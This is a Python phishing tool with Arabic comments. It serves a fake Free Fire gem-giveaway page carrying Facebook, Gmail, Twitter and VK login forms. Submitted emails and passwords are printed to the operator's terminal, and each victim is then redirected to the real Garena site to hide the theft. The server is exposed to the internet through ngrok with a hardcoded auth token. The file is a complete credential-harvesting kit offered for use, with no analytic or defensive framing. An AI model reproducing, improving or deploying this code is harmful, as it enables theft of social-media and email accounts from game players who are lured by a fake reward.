import os
import logging
from flask import Flask, request, redirect
from pyngrok import ngrok, conf

# تعريف الألوان
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# ASCII Art
ascii_art = f"""{GREEN}
 ___ __  __    _    ____       ____  _ _____ 
|_ _|  \/  |  / \  |  _ \     |___ \/ |___ / 
 | || |\/| | / _ \ | | | |_____ __) | | |_ \ 
 | || |  | |/ ___ \| |_| |_____/ __/| |___) |
|___|_|  |_/_/   \_\____/     |_____|_|____/ {RESET}
"""

# صفحة HTML
html_page = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTpRXut1caOdcEF0YeQlW6MBS4-qON3jozXlQ&s');
            background-size: cover;
            background-position: center;
        }
        .header {
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            text-align: center;
            padding: 1rem;
            width: 100%;
            position: absolute;
            top: 0;
        }
        .form-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 2rem;
            border-radius: 0.5rem;
            width: 300px;
            margin-top: 4rem;
        }
        .logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 1rem;
            display: block;
        }
        h1, h2 {
            color: white;
            text-align: center;
            margin-bottom: 1rem;
        }
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-bottom: 1rem;
            transition: all 0.5s ease;
        }
        .social-icons button {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 2rem;
            color: white;
            transition: all 0.5s ease;
            opacity: 1;
        }
        .social-icons button:hover {
            transform: scale(1.2);
        }
        .login-form {
            display: none;
        }
        .login-form.active {
            display: block;
        }
        input, button[type="submit"] {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 0.5rem;
            border: none;
            border-radius: 0.25rem;
        }
        button[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button[type="submit"]:hover {
            opacity: 0.9;
        }
        .message {
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>شركة Garena تهدي 200 جوهرة لمن يقوم بتسجيل دخول وتصويت عليها </h1>
        </div>
        <div class="form-container">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBKw77yZtnx9hNCRbdsqHmt4X7rEroeclZVw&amp;s" alt="Free Fire Logo" class="logo">
            <h2>Free Fire</h2>
            <div class="social-icons" id="socialIcons">
                <button onclick="showForm('facebook', 'فيسبوك')" id="facebookBtn"><i class="fab fa-facebook"></i></button>
                <button onclick="showForm('gmail', 'جوجل')" id="gmailBtn"><i class="fab fa-google"></i></button>
                <button onclick="showForm('twitter', 'تويتر')" id="twitterBtn"><i class="fab fa-twitter"></i></button>
                <button onclick="showForm('vk', 'VK')" id="vkBtn"><i class="fab fa-vk"></i></button>
            </div>
            <form id="facebook-form" class="login-form" action="/submit/facebook" method="post">
                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required="">
                <input type="password" name="password" placeholder="كلمة المرور" required="">
                <button type="submit" style="background-color: #3b5998;">تسجيل الدخول بفيسبوك</button>
            </form>
            <form id="gmail-form" class="login-form" action="/submit/gmail" method="post">
                <input type="email" name="email" placeholder="البريد الإلكتروني" required="">
                <input type="password" name="password" placeholder="كلمة المرور" required="">
                <button type="submit" style="background-color: #db4437;">تسجيل الدخول بـ Gmail</button>
            </form>
            <form id="twitter-form" class="login-form" action="/submit/twitter" method="post">
                <input type="text" name="email" placeholder="اسم المستخدم أو البريد الإلكتروني" required="">
                <input type="password" name="password" placeholder="كلمة المرور" required="">
                <button type="submit" style="background-color: #1da1f2;">تسجيل الدخول بتويتر</button>
            </form>
            <form id="vk-form" class="login-form" action="/submit/vk" method="post">
                <input type="text" name="email" placeholder="الهاتف أو البريد الإلكتروني" required="">
                <input type="password" name="password" placeholder="كلمة المرور" required="">
                <button type="submit" style="background-color: #4a76a8;">تسجيل الدخول بـ VK</button>
            </form>
            <p id="message" class="message">اختر طريقة تسجيل الدخول للمتابعة</p>
        </div>
    </div>
    <script>
        function showForm(formId, platform) {
            const forms = document.querySelectorAll('.login-form');
            forms.forEach(form => form.classList.remove('active'));
            document.getElementById(`${formId}-form`).classList.add('active');
            document.getElementById('message').style.display = 'none';

            const socialIcons = document.getElementById('socialIcons');
            socialIcons.classList.add('collapsed');

            const buttons = socialIcons.getElementsByTagName('button');
            for (let button of buttons) {
                button.classList.remove('active');
            }
            document.getElementById(`${formId}Btn`).classList.add('active');

            // Reorder buttons to put the active one in the middle
            const activeButton = document.getElementById(`${formId}Btn`);
            socialIcons.insertBefore(activeButton, socialIcons.children[2]);
        }
    </script>
</body>
</html>
"""

# واجهة المستخدم الرئيسية
def main_menu():
    print(ascii_art)
    print(f"{RED}FREE FIRE --#=IMAD-213#=--{RESET}")
    print(f"{RED}1-FREE FIRE NOM{RESET}")
    print(f"{RED}2-FREE FIRE PAGE HACK{RESET}")
    choice = input(f"{GREEN}Select number: {RESET}")
    return choice

# تشغيل Flask لعرض صفحة HTML وعرض البيانات في الطرفية
def run_flask_with_terminal_display():
    app = Flask(__name__)

    # تعطيل جميع الرسائل الافتراضية لـ Flask
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app.route('/')
    def index():
        return html_page

    @app.route('/submit/<platform>', methods=['POST'])
    def submit(platform):
        email = request.form.get('email')
        password = request.form.get('password')
        # عرض البيانات في الطرفية مع تحديد المنصة
        print(f"{GREEN}Received Data from {platform}:{RESET}")
        print(f"Email: {email}")
        print(f"Password: {password}")
        # إعادة توجيه المستخدم إلى صفحة المكافآت
        return redirect("https://reward.ff.garena.com/en")

    # إعداد ngrok باستخدام التوكن
    NGROK_TOKEN = "2uYempqFKOiWNkwyfKruAk8ybFf_4DBedXLU2CvpeZ6w5eJkw"
    conf.get_default().auth_token = NGROK_TOKEN
    public_url = ngrok.connect(2222, "http")
    print(f"{GREEN}Ngrok Public URL: {public_url.public_url}{RESET}")

    # تشغيل الخادم Flask
    app.run(port=2222, debug=False)

# نقطة البداية
if __name__ == "__main__":
    while True:
        choice = main_menu()
        if choice == "1":
            os.system("python wz.py")  # تشغيل wz.py
        elif choice == "2":
            print(f"{GREEN}Starting FREE FIRE PAGE HACK...{RESET}")
            run_flask_with_terminal_display()
            break
        else:
            print(f"{RED}Invalid choice. Please select a valid option.{RESET}")
